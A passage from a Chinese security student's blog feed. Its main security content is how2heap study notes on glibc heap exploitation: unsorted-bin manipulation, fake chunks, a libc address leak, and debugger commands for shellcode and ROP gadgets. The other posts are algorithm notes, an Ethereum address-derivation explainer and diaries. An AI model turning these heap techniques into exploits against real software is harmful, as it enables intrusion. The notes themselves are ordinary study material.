class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp">bck = victim-&gt;bk;<br><span class="hljs-comment">/* remove from unsorted list */</span><br>unsorted_chunks (av)-&gt;bk = bck;<br>bck-&gt;fd = unsorted_chunks (av);<br></code></pre></td></tr></table></figure><p>显然这个 chunk 的大小是不够的，所以被放入 small bin 中。<br>现在再从 unsorted bin 拿出一个被构造的 fake chunk ，现在有了一些检查：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (__builtin_expect (chunksize_nomask (victim) &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>    || __builtin_expect (chunksize_nomask (victim)<br>                         &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br></code></pre></td></tr></table></figure><p>大小合理，轻松绕过。而另外值得注意的是 fake chunk 的 fd 指针被修改了，这是 unsorted bin 的地址，通过它可以泄露 libc 地址.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp">pwndbg&gt; x/<span class="hljs-number">6</span>gx victim - <span class="hljs-number">2</span><br><span class="hljs-number">0x8008010</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000020</span><br><span class="hljs-number">0x8008020</span>:      <span class="hljs-number">0x00007fffff3f3b88</span>      <span class="hljs-number">0x00007fffff3f3b88</span><br><span class="hljs-number">0x8008030</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></table></figure><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="Pwngdb"><a href="#Pwngdb" class="headerlink" title="Pwngdb"></a>Pwngdb</h2><p>libc : Print the base address of libc<br>ld : Print the base address of ld<br>codebase : Print the base of code segment<br>heap : Print the base of heap<br>got : Print the Global Offset Table infomation<br>dyn : Print the Dynamic section infomation<br>findcall : Find some function call<br>bcall : Set the breakpoint at some function call<br>tls : Print the thread local storage address<br>at : Attach by process name<br>findsyscall : Find the syscall<br>force : Calculate the nb in the house of force.<br>heapinfo :打印 heap 的一些信息<br>heapinfoall : Print some infomation of heap (all threads)<br>arenainfo : Print some infomation of all arena<br>chunkptr : 打印 chunk 的信息 后面加 chunk 返回给用户的地址<br>printfastbin : 打印 fastbin 的链表信息<br>tracemalloc on : 追踪程序 chunk 的 malloc 和 free<br>parseheap :解析堆的布局<br>magic : 打印出 glibc 中一些有用的信息<br>fp : show FILE structure<br>fp (Address of FILE)</p><h2 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h2><p>top_chunk: 显示 top chunk 的信息<br>malloc_chunk address:打印出已被分配的 chunk 的信息<br>fastbins:显示 fastbins 链表信息<br>unsorted:显示 unsortedbin 的信息<br>smallbins:显示 smallbins 的信息<br>largebins:显示 largebins 的信息<br>bins:显示所有 bins 的信息<br>mp：显示一些内存管理用到的全局变量<br>arena：显示分配区的信息</p><h2 id="peda-基础命令"><a href="#peda-基础命令" class="headerlink" title="peda 基础命令"></a>peda 基础命令</h2><p>​</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs cpp">file 路径　-　附加文件<br><span class="hljs-keyword">break</span> *<span class="hljs-number">0x400100</span> (b main) - 在 <span class="hljs-number">0x400100</span> 处下断点<br>tb  - 一次性断点<br>info b - 查看断点信息<br>enable   -   激活断点<br>disable  -   禁用断点<br><span class="hljs-keyword">delete</span> [number]  -  删除断点<br>watch *(<span class="hljs-keyword">int</span> *)<span class="hljs-number">0x08044530</span>  -  在内存<span class="hljs-number">0x0804453</span>处的数据改变时stop<br>p $eax - 输出eax的内容<br><span class="hljs-built_in">set</span> $eax=<span class="hljs-number">4</span> - 修改变量值<br><br>c - 继续运行<br>r - 开始运行<br>ni - 单步步过<br>si - 单步步入<br>fini - 运行至函数刚结束处<br><span class="hljs-keyword">return</span> expression - 将函数返回值指定为expression<br>bt - 查看当前栈帧<br>info f - 查看当前栈帧<br>context - 查看运行上下文<br><span class="hljs-built_in">stack</span> - 查看当前堆栈<br>call func - 强制函数调用<br><span class="hljs-built_in">stack</span> <span class="hljs-number">100</span> - 插件提供的，显示栈中<span class="hljs-number">100</span>项<br>find xxx　 - 快速查找，很实用<br><br>x/&lt;n/f/u&gt; &lt;addr&gt;     n、f、u是可选的参数。<br>x /<span class="hljs-number">4</span>xg $ebp：查看ebp开始的<span class="hljs-number">4</span>个<span class="hljs-number">8</span>字节内容<br>x/wx $esp 　　以<span class="hljs-number">4</span>字节<span class="hljs-number">16</span>进制显示栈中内容<br>b表示单字节，h表示双字节，w表示四字 节，g表示八字节<br>s 按字符串输出<br>x 按十六进制格式显示变量。<br>d 按十进制格式显示变量。<br>u 按十六进制格式显示无符号整型。<br>o 按八进制格式显示变量。<br>t 按二进制格式显示变量。<br>a 按十六进制格式显示变量。<br>c 按字符格式显示变量。<br>f 按浮点数格式显示变量。<br>i：反汇编<br><br>但是实际的组合就那么几种：<br>x/s 地址　　查看字符串<br>x/wx 地址　　查看DWORD<br>x/c 地址　　单字节查看<br>x/<span class="hljs-number">16</span>x $esp+<span class="hljs-number">12</span> 查看寄存器偏移<br><br><span class="hljs-built_in">set</span> args  - 可指定运行时参数。（如：<span class="hljs-built_in">set</span> args <span class="hljs-number">10</span> <span class="hljs-number">20</span> <span class="hljs-number">30</span> <span class="hljs-number">40</span> <span class="hljs-number">50</span>）<br>show args  - 命令可以查看设置好的运行参数。<br></code></pre></td></tr></table></figure><h2 id="peda-插件命令"><a href="#peda-插件命令" class="headerlink" title="peda 插件命令"></a>peda 插件命令</h2><ul><li>aslr - 显示/设定 GDB 的 ASLR(地址空间配置随机加载)设置</li></ul><p>gdb-peda$ aslr ASLR is OFF</p><ul><li>checksec - 检查二进制文件的各种安全选项</li></ul><p>gdb-peda$ checksec CANARY : disabled FORTIFY : disabled NX : ENABLED PIE : disabled RELRO : Partial</p><ul><li>dumpargs - 函数将要被调用时，显示将要被传入函数的所有参数(默认会在反汇编代码下方自动显示)</li><li>dumprop - 在给定内存范围中 Dump 出所有 ROP gadgets</li><li>elfheader - 从被调试的 ELF 文件中获取标题信息</li><li>elfsymbol - 从 ELF 文件获取非调试符号信息（plt 表）</li><li>lookup - 搜索所有地址/参考地址属于一个内存范围</li><li>patch - 修补程序内存以 string / hexstring / int 的地址开始</li><li>procinfo - 显示/ proc / pid /</li><li>pshow - 显示各种 PEDA 选项和其他设置</li><li>pset - 设置各种 PEDA 选项和其他设置</li><li>pattern - 生成字符串模板 写入内存 用于定位溢出点<ul><li>pattern create size 生成特定长度字符串</li><li>pattern offset value 定位字符串</li></ul></li><li>procinfo – Display various info from /proc/pid/</li><li>pshow – Show various PEDA options and other settings</li><li>pset– Set various PEDA options and other settings</li><li>readelf - 从 ELF 文件获取标题信息</li><li>ropgadget - 获取二进制或库的通用 ROP 小工具</li><li>ropsearch - 在内存中搜索 ROP 小工具</li><li>searchmem - 用搜索内存<ul><li>searchmem|find - 在内存中查找字符串，支持正则表达式，例如 searchmem “/bin/sh” libc</li></ul></li><li>shellcode - 生成或下载常用的 shellcode。</li><li>skeleton - 生成 python 漏洞利用代码模板</li><li>vmmap - 可以用来查看栈、bss 段是否可以执行</li><li>xormem - 用一个键异或存储区域</li><li>ptype struct link_map - 查看 link_map 定义</li><li>p &amp;((struct link_map*)0)-&gt;l_info - 查看 l_info 成员偏移</li></ul><h1 id="主要参考"><a href="#主要参考" class="headerlink" title="主要参考"></a>主要参考</h1><p>【1】<a href="https://blog.csdn.net/kelxLZ/article/details/112972504">https://blog.csdn.net/kelxLZ/article/details/112972504</a><br>​</p><p>​</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>因为之前把 wsl2 搞崩了，为了这个实验，又又又重装了一次<br>卸载过程参考：<br><a href="https://blog.csdn.net/qq_39522282/article/details/86168907">https://blog.csdn.net/qq_39522282/article/details/86168907</a><br><a href="https://blog.csdn.net/gzroy/article/details/104069536">https://blog.csdn.net/gzroy/article/details/104069536</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;tags: []&lt;br&gt;categories: []&lt;br&gt;cover: “”&lt;br&gt;​&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;实验使用 wsl 进行，具体的 glibc 版本为 2.28，运行&lt;code&gt;/lib/x86_64-linux-gnu/libc.so.6&lt;/code&gt;即可看到版本&lt;br&gt;&lt;img src=&quot;https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-1.png#clientId=u347f053a-7aac-4&amp;from=paste&amp;height=121&amp;id=ubcbe185e&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=241&amp;originWidth=756&amp;originalType=binary&amp;size=264115&amp;status=done&amp;style=none&amp;taskId=u396bde25-eab2-4a06-bb3b-c2811987e8d&amp;width=378&quot; alt=&quot;image.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>PAT算法刷题(2)</title>
    <link href="https://www.blog.hackerjerry.top/2021/05/26/PAT%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98(2)_new/"/>
    <id>https://www.blog.hackerjerry.top/2021/05/26/PAT%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98(2)_new/</id>
    <published>2021-05-26T12:29:57.000Z</published>
    <updated>2021-11-14T09:10:29.180Z</updated>
    
    <content type="html"><![CDATA[<p>tags: []<br>categories: []<br>cover: “”<br>​</p><hr><p>something</p><a id="more"></a><h1 id="指针变量"><a href="#指针变量" class="headerlink" title="指针变量"></a>指针变量</h1><p><img src="https://image.hackerjerry.top/PAT%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98(2)-1.png#clientId=u4e2ecc72-0b61-4&from=paste&height=80&id=u74d31445&margin=%5Bobject%20Object%5D&name=image.png&originHeight=160&originWidth=1066&originalType=binary%E2%88%B6=1&size=160064&status=done&style=none&taskId=ube714c6b-8abc-4802-833e-8c45fb5800e&width=533" alt="image.png"><br><img src="https://image.hackerjerry.top/PAT%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98(2)-2.png#clientId=u4e2ecc72-0b61-4&from=paste&height=61&id=u5201477b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=122&originWidth=1067&originalType=binary%E2%88%B6=1&size=134720&status=done&style=none&taskId=u0092dfb5-b66b-4a05-aeb6-8f6dcb75222&width=533.5" alt="image.png"><br><img src="https://image.hackerjerry.top/PAT%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98(2)-3.png#clientId=u4e2ecc72-0b61-4&from=paste&height=295&id=ucedf3117&margin=%5Bobject%20Object%5D&name=image.png&originHeight=590&originWidth=736&originalType=binary%E2%88%B6=1&size=388439&status=done&style=none&taskId=u418c5398-37ca-45e4-890a-f7389a9b005&width=368" alt="image.png"><br><img src="https://image.hackerjerry.top/PAT%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98(2)-4.png#clientId=u4e2ecc72-0b61-4&from=paste&height=174&id=u5ad65c12&margin=%5Bobject%20Object%5D&name=image.png&originHeight=348&originWidth=1082&originalType=binary%E2%88%B6=1&size=336793&status=done&style=none&taskId=ubbb32c63-b028-443d-b148-9eac916a2f7&width=541" alt="image.png"></p><h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1>]]></content>
    
    
    <summary type="html">&lt;p&gt;tags: []&lt;br&gt;categories: []&lt;br&gt;cover: “”&lt;br&gt;​&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;something&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>区块链账户地址相关问题</title>
    <link href="https://www.blog.hackerjerry.top/2021/05/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E8%B4%A6%E6%88%B7%E5%9C%B0%E5%9D%80%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98_new/"/>
    <id>https://www.blog.hackerjerry.top/2021/05/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E8%B4%A6%E6%88%B7%E5%9C%B0%E5%9D%80%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98_new/</id>
    <published>2021-05-20T07:11:35.000Z</published>
    <updated>2021-11-14T09:15:39.468Z</updated>
    
    <content type="html"><![CDATA[<p>tags: [区块链]<br>categories: [区块链]<br>cover: “”<br>​</p><hr><p>​</p><a id="more"></a><h1 id="私钥、公钥和地址是如何生成的？"><a href="#私钥、公钥和地址是如何生成的？" class="headerlink" title="私钥、公钥和地址是如何生成的？"></a>私钥、公钥和地址是如何生成的？</h1><p>以太坊地址生成的流程也是：私钥 -&gt; 公钥 -&gt; 地址。因此地址的生成需要三步：</p><ol><li>生成一个随机的私钥（32 字节）-64 位的 16 进制字符</li><li>通过私钥生成公钥（64 字节）</li><li>通过公钥得到地址（20 字节）</li></ol><h2 id="第一步：私钥-private-key"><a href="#第一步：私钥-private-key" class="headerlink" title="第一步：私钥 (private key)"></a>第一步：私钥 (private key)</h2><p>伪随机数产生的 256bit 私钥示例(256bit  16 进制 32 字节)<br><code>18e14a7b6a307f426a94f8114701e7c8e774e7f9a47e2c2035db29a206321725</code><br>​</p><h2 id="第二步：公钥-public-key"><a href="#第二步：公钥-public-key" class="headerlink" title="第二步：公钥 (public key)"></a>第二步：公钥 (public key)</h2><ol><li>采用椭圆曲线数字签名算法 ECDSA-secp256k1 将私钥（32 字节）映射成公钥（65 字节）（前缀 04+X 公钥+Y 公钥）：</li></ol><p><code>0450863ad64a87ae8a2fe83c1af1a8403cb53f53e486d8511dad8a04887e5b23522cd470243453a299fa9e77237716103abc11a1df38855ed6f2ee187e9c582ba6</code></p><ol start="2"><li>拿公钥（非压缩公钥）来 hash，计算公钥的<strong>Keccak-256</strong>哈希值（32bytes）：</li></ol><p><code>fc12ad814631ba689f7abe67**1016f75c54c607f082ae6b0881fac0abeda21781**</code></p><ol start="3"><li>取上一步结果取后 20bytes 即以太坊地址：</li></ol><p><code>1016f75c54c607f082ae6b0881fac0abeda21781</code><br>​</p><h2 id="第三步：地址-address"><a href="#第三步：地址-address" class="headerlink" title="第三步：地址 (address)"></a>第三步：地址 (address)</h2><p><code>0x1016f75c54c607f082ae6b0881fac0abeda21781</code></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;tags: [区块链]&lt;br&gt;categories: [区块链]&lt;br&gt;cover: “”&lt;br&gt;​&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;​&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>生活周报-May-17-to-23</title>
    <link href="https://www.blog.hackerjerry.top/2021/05/20/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-May-17-to-23_new/"/>
    <id>https://www.blog.hackerjerry.top/2021/05/20/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-May-17-to-23_new/</id>
    <published>2021-05-20T07:01:13.000Z</published>
    <updated>2021-11-14T09:17:41.744Z</updated>
    
    <content type="html"><![CDATA[<h1 id="时讯"><a href="#时讯" class="headerlink" title="时讯"></a>时讯</h1><ol><li>祝融号发回遥测图像，很棒，中国航天 NB！</li><li>华强北的赛格大厦发生摇晃，事故原因正在调查中。</li><li>新垣结衣结婚啦，虽然我没有看过她的作品，但的确是一位看起来非常舒服的女星呢！《逃避虽可耻但有用》是她和他老公主演的电视剧，感觉会很有意思呢，以后有空了一定要看一看！</li><li>比特币开启熊市，距离 6W 美元的高点，目前已经跌破 3W 美元。伴随其的，是整个加密货币市场的全线崩盘，国家机器开始干预这个疯狂的市场。</li><li>南极洲最大冰山脱落，相当于 60%的上海。</li><li>云南大理 6.4 级地震。</li><li>青海 7.4 级地震。</li><li>5 月 22 日，袁隆平院士去世，享年 91 岁。</li><li>吴孟超院士去世，享年 99 岁。</li><li>甘肃白银景泰超级山地马拉松发生突发性局部恶劣天气，导致 21 名马拉松选手遇难。</li><li>大连宝马撞死 5 人，时速达 195km/h，现场视频非常可怕，系投资失败报复社会。</li></ol><h1 id="小事"><a href="#小事" class="headerlink" title="小事"></a>小事</h1><ol><li>去和导师面基了，表现的不是很好，有不少问题问题回答都有点问题，提升自己的能力 up,up!还有一个半月，来得及！</li><li>西交好和谐，在里面走有种在青岛的感觉！起伏的道路，到处合抱粗的梧桐，简直无比舒服！虽然楼很旧，但是老师很 nice，真的真的希望可以保研成功到西交呀！</li><li>无线安全实验把我搞迷了，实验成功率不高，特别容易收到干扰，比如我们一直没有收到自己的基站信号，别的人也收不到他们自己的基站信号。</li></ol><h1 id="本周收藏"><a href="#本周收藏" class="headerlink" title="本周收藏"></a>本周收藏</h1><h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><ol><li>fuzzingbook2</li><li><a href="https://xz.aliyun.com/t/2582">通过 how2heap 复习堆利用 (一）</a></li><li><a href="https://www.anquanke.com/post/id/192823">How2Heap 堆利用学习笔记（一）</a></li><li><a href="https://bbs.pediy.com/thread-259269.htm">堆入门攻略-how2heap 学习总结</a></li><li>patchelf</li><li><a href="https://www.anquanke.com/post/id/86808">how2heap 总结-上</a></li><li><a href="https://www.anquanke.com/post/id/86809">how2heap 总结-下</a></li><li><a href="https://juejin.cn/post/6844903829952004104">how2heap 之 glibc——2.26 版本</a></li><li><a href="https://a1ex.online/2020/08/30/PWN-%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E7%9A%84glibc/">PWN_使用不同版本的 glibc</a></li><li><a href="https://github.com/matrix1001/glibc-all-in-one">https://github.com/matrix1001/glibc-all-in-one</a></li></ol><h2 id="剧集"><a href="#剧集" class="headerlink" title="剧集"></a>剧集</h2><p>无</p><h2 id="摘录"><a href="#摘录" class="headerlink" title="摘录"></a>摘录</h2><p>深度思考</p><h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><ol><li>冒泡排序及优化、快排、希尔排序、堆排序、归并排序</li></ol><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><ol><li>我逐渐理解了为什么现在的大部分女生都不再社交平台秀恩爱，或者是简单的展示自己的恋爱状态。</li><li>这周世界非常混乱，周末短短几天，大地震、袁老千古，真的让人心乱，就和做梦似的。记得那天，上午还晴空，过了中午就开始阴云密布，狂风卷集着乌云，冷雨一直下，后到中雨，直至午夜。</li><li>长亭外，古道边，芳草碧连天。我参与了袁老的网上吊唁活动，寄念哀思，希望袁老能在天上继续保佑着华夏大地。</li></ol><p><img src="https://image.hackerjerry.top/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-May-17-to-23-1.jpeg#clientId=u737e3495-1e5b-4&from=drop&height=373&id=u7705954a&margin=%5Bobject%20Object%5D&name=mmexport1621741590095.jpg&originHeight=1920&originWidth=1080&originalType=binary&size=1086399&status=done&style=none&taskId=u80329fcb-efdd-4906-9ef7-3f52be9694e&width=210" alt="mmexport1621741590095.jpg"></p><ol start="4"><li>一定要眼观六路，耳听八方。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;时讯&quot;&gt;&lt;a href=&quot;#时讯&quot; class=&quot;headerlink&quot; title=&quot;时讯&quot;&gt;&lt;/a&gt;时讯&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;祝融号发回遥测图像，很棒，中国航天 NB！&lt;/li&gt;
&lt;li&gt;华强北的赛格大厦发生摇晃，事故原因正在调查中。&lt;/li&gt;
&lt;li&gt;</summary>
      
    
    
    
    <category term="周报" scheme="https://www.blog.hackerjerry.top/categories/%E5%91%A8%E6%8A%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>PAT算法刷题（1）</title>
    <link href="https://www.blog.hackerjerry.top/2021/05/15/PAT%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%EF%BC%881%EF%BC%89_new/"/>
    <id>https://www.blog.hackerjerry.top/2021/05/15/PAT%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%EF%BC%881%EF%BC%89_new/</id>
    <published>2021-05-15T15:56:55.000Z</published>
    <updated>2021-11-14T09:11:11.036Z</updated>
    
    <content type="html"><![CDATA[<p>tags: []<br>categories: []<br>cover: “”<br>​</p><hr><p>开始</p><a id="more"></a><h1 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h1><ol><li>浮点型不要用 float 定义，而要用 double 定义，因为精度问题，float 只能有效精度为 6 位左右。</li><li>ASCII 码中，小写字母比大写字母的 ASCII 码大 32，具体是 A<del>Z：65</del>90，a<del>z：97</del>122</li><li>位运算符：<ol><li>A&lt;&lt;x 左移，整数 A 按照二进制左移 x 位</li><li>a &amp; b 位与，整数 a 和 b 按二进制对齐，按照位进行<strong>与运算</strong></li><li>a | b 位或，整数 a 和 b 按二进制对齐，按照位进行<strong>或运算</strong></li><li>a ^ b 位异或，按位进行异或运算</li><li>~a，取反，整数 a 的二进制每一位取反</li></ol></li><li>scanf 的格式化输入–只记录几种不常用的<ol><li>long long 的输入 ：%lld</li><li>double 的输入： %lf</li><li>字符串（char 数组）: %s，注意，字符串输入不需要加&amp;进行取址，即 scanf(“%s”,str)是正确的。（因为数组名称本身就代表这个数组第一个元素的地址，所以不需要加取地址）</li></ol></li><li>typedef 是给复杂的数据结构起别名的<ol><li>例 1： typedef long long LL;//给 long long 起别名 LL</li></ol></li><li>一些常用的 math 函数<ol><li>floor(double x)–向下取整</li><li>ceil(double x)–向上取整</li><li>log()–用于返回以自然对数为底的对数<ol><li>注意，c 里面没有对任意底数求对数的函数，必须用换底公式 log_a{b}=log_e{b}/log_e{a}</li></ol></li><li>sin,cos,tan–三角函数，必须是弧度制，即 pi/2 一类的</li><li>asin,acos–返回 double 的三角函数值</li></ol></li><li>switch</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">switch</span>(表达式)&#123;<br>    <span class="hljs-keyword">case</span> 常量结果<span class="hljs-number">1</span>:<br>        ...<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> 结果<span class="hljs-number">2</span>:<br>        ...<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        ....<br>&#125;<br></code></pre></td></tr></table></figure><ol start="8"><li>数组初始化<ol><li>比如 <code>int a[10] = &#123;0&#125;;</code>就可以把整个数组都赋值 0，或者<code>int a[10] = &#123;&#125;;</code>也可以做到</li><li>如果数组大小在 10 的 6 次方以上，需要将其定义在主函数之外，即静态存储区申请空间，如<code>int a[1000000];</code></li><li>memset-对数组中每个元素赋值相同值<ol><li>memset(数组名，值，sizeof(数组名))</li><li>建议只使用 memset 赋值 0 和-1，因为它是按字节赋值，比如 int 是 4 个字节</li><li>对于数组赋予其他值（比如 1），请使用 fill 函数</li></ol></li></ol></li><li>gets 识别\n 作为输入结束，因此使用 scanf 接收完之后，如果要使用 gets，需要先用 getchar()接收整数后的换行符</li><li>strlen()–字符串长度</li><li>strcmp(char a[].char b[])–字符串比较</li><li>strcpy(char a[].char b[])–把 b 字符串数组赋给 a 数组</li><li>字符串处理利器<ol><li>sscanf(char str[],”%d”,&amp; int n)–把字符串数组的内容以%d 的格式写到变量 n 中–从左到右</li><li>sprintf(char str[],”%d”,int n)–把整型变量 n 以%d 的格式写到 str 数组中，从右到左</li></ol></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;tags: []&lt;br&gt;categories: []&lt;br&gt;cover: “”&lt;br&gt;​&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;开始&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>生活周报-May-10-to-16</title>
    <link href="https://www.blog.hackerjerry.top/2021/05/15/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-May-10-to-16_new/"/>
    <id>https://www.blog.hackerjerry.top/2021/05/15/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-May-10-to-16_new/</id>
    <published>2021-05-15T15:44:27.000Z</published>
    <updated>2021-11-14T09:18:22.876Z</updated>
    
    <content type="html"><![CDATA[<h1 id="时讯"><a href="#时讯" class="headerlink" title="时讯"></a>时讯</h1><ol><li>成都 49 中跳楼案水落石出</li><li>比特币暴跌，20 万用户爆仓</li><li>盖茨被爆性丑闻</li><li>祝融火星探测器成功登录火星乌托邦平原</li></ol><h1 id="小事"><a href="#小事" class="headerlink" title="小事"></a>小事</h1><ol><li>又是暴雨，下的及时，下的巧妙，恰似那未曾萌芽的爱情。始于暴雨，终于暴雨。</li></ol><h1 id="本周收藏"><a href="#本周收藏" class="headerlink" title="本周收藏"></a>本周收藏</h1><h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><p>看到了哪些好文？</p><h2 id="剧集"><a href="#剧集" class="headerlink" title="剧集"></a>剧集</h2><p>追了哪些剧？</p><h2 id="摘录"><a href="#摘录" class="headerlink" title="摘录"></a>摘录</h2><p>深度思考</p><h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><p>又学了哪些新知识?</p><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>关于人生，关于体验</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;时讯&quot;&gt;&lt;a href=&quot;#时讯&quot; class=&quot;headerlink&quot; title=&quot;时讯&quot;&gt;&lt;/a&gt;时讯&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;成都 49 中跳楼案水落石出&lt;/li&gt;
&lt;li&gt;比特币暴跌，20 万用户爆仓&lt;/li&gt;
&lt;li&gt;盖茨被爆性丑闻&lt;/li&gt;
&lt;li</summary>
      
    
    
    
    <category term="周报" scheme="https://www.blog.hackerjerry.top/categories/%E5%91%A8%E6%8A%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>图搜索算法学习</title>
    <link href="https://www.blog.hackerjerry.top/2021/05/11/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0_new/"/>
    <id>https://www.blog.hackerjerry.top/2021/05/11/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0_new/</id>
    <published>2021-05-11T07:53:33.000Z</published>
    <updated>2021-11-14T09:18:01.636Z</updated>
    
    <content type="html"><![CDATA[<p>本文将从图搜索算法的基本流程入手，层层递进地介绍几种图搜索算法。首先是两种针对无权图的基本图搜索算法：<strong>深度优先搜索(Depth First Search, DFS)**、</strong>广度优先搜索(Breadth First Search, BFS)<strong>。它们的区别在于 openlist(后面介绍)所选用的数据结构类型不同，前者使用栈，后者使用队列；之后引入一种启发式搜索算法：</strong>贪婪最佳优先算法*<em>(<strong>Greedy Best First Search, GBFS</strong>)，用来提高搜索效率，但是不能确保找到最优路径；最后介绍两种在路径规划中非常经典的算法：<strong>Dijkstra 算法</strong>、**A\</em>算法**，前者是广度优先算法(BFS)在带权图中的扩展，后者则是在前者中加入启发函数得到的算法，兼顾效率和完备性。</p><a id="more"></a><h2 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h2><p>下面切入正题，图搜索算法的基本流程如下：</p><ul><li>创建一个容器，一般称为<strong>openlist</strong>，用来存储将要访问的节点</li><li>将起点加入容器</li><li>开始循环：</li><li>—- 弹出：从容器中取出一个节点</li><li>—- 扩展：获取该节点周围的节点，将这些节点放入容器</li></ul><p>作者：鬼木士链接：<a 